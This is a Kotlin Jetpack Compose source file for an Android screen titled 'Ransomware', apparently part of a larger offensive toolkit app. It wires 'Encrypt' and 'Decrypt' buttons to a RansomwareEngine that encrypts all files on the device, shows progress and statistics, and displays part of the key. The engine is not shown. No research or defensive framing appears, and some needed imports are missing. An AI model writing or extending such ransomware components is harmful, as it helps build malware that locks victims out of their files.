package com.genetic.system.v3.ui.screens

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import com.genetic.system.v3.engine.RansomwareEngine
import kotlinx.coroutines.launch

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun RansomwareScreen(navController: NavController) {
    val scope = rememberCoroutineScope()
    var isEncrypted by remember { mutableStateOf(false) }
    var progress by remember { mutableStateOf(0f) }
    var status by remember { mutableStateOf("Ready") }
    val ransomware = remember { RansomwareEngine() }
    
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("💀 Ransomware", color = Color.White) },
                navigationIcon = {
                    IconButton(onClick = { navController.popBackStack() }) {
                        Icon(Icons.Default.ArrowBack, contentDescription = null, tint = Color.White)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color(0xFF1A1A2E))
            )
        },
        containerColor = Color(0xFF0A0A0F)
    ) { padding ->
        LazyColumn(
            modifier = Modifier.fillMaxSize().padding(padding).padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF1A0A0A)),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Column(
                        modifier = Modifier.fillMaxWidth().padding(20.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Text("🔐 AES-256 GCM", fontSize = 24.sp, color = Color.Red, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        Text("Military grade encryption", color = Color.Gray, fontSize = 14.sp)
                    }
                }
            }
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF12121E))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("Status", color = Color.Gray, fontSize = 12.sp)
                        Text(status, color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        LinearProgressIndicator(
                            progress = progress,
                            modifier = Modifier.fillMaxWidth(),
                            color = Color.Red,
                            trackColor = Color.DarkGray
                        )
                        Text("${(progress * 100).toInt()}%", color = Color.Gray, fontSize = 12.sp)
                    }
                }
            }
            item {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Button(
                        onClick = {
                            scope.launch {
                                status = "Encrypting..."
                                ransomware.encryptAllFiles { p -> progress = p }
                                isEncrypted = true
                                status = "🔒 Encrypted"
                            }
                        },
                        modifier = Modifier.weight(1f),
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Red),
                        enabled = !isEncrypted
                    ) { Text("🔒 Encrypt") }
                    
                    Button(
                        onClick = {
                            scope.launch {
                                status = "Decrypting..."
                                ransomware.decryptAllFiles { p -> progress = p }
                                isEncrypted = false
                                status = "🔓 Decrypted"
                            }
                        },
                        modifier = Modifier.weight(1f),
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Green),
                        enabled = isEncrypted
                    ) { Text("🔓 Decrypt") }
                }
            }
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF0D0D18))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("📊 Statistics", color = Color.Gray, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.height(8.dp))
                        Row(horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                            Text("Files encrypted:", color = Color.Gray, fontSize = 12.sp)
                            Text("${ransomware.encryptedCount}", color = Color.White, fontSize = 12.sp)
                        }
                        Row(horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                            Text("Total size:", color = Color.Gray, fontSize = 12.sp)
                            Text("${ransomware.totalSize} MB", color = Color.White, fontSize = 12.sp)
                        }
                        Row(horizontalArrangement = Arrangement.SpaceBetween, modifier = Modifier.fillMaxWidth()) {
                            Text("Key:", color = Color.Gray, fontSize = 12.sp)
                            Text(ransomware.encryptionKey.take(16) + "...", color = Color(0xFF4ECDC4), fontSize = 12.sp)
                        }
                    }
                }
            }
        }
    }
}
